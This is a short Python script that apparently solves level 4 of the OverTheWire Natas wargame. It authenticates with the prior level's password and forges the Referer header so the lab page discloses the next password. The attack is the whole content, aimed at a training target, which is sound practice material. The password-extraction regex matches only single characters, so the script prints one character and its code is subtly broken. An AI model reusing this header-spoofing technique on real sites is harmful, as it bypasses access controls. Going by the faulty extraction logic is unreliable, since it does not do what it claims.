import re
import requests
from requests.auth import HTTPBasicAuth
import natas3solution

auth = HTTPBasicAuth('natas4', natas3solution.get_pass())
def get_pass():
    head = {'Referer': 'http://natas5.natas.labs.overthewire.org/'}
    r = requests.get('http://natas4.natas.labs.overthewire.org/', auth=auth,headers=head)
    pass_regex = '[a-zA-Z0-9]'
    print(re.findall(pass_regex,r.text)[1])
if __name__ == "__main__":
    get_pass()
